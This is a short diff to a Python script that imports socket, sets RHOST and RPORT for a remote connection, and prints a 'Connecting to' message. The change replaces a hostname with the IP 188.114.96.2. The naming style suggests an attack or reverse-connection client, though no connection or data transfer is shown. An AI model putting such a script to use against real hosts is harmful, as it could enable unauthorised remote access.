@@ -1,6 +1,6 @@
 import socket
 
-RHOST = "codercode.epizy.com"
+RHOST = "188.114.96.2"
 RPORT = 12437
 
 print("[+] Connecting to %s:%d") % (RHOST, RPORT)
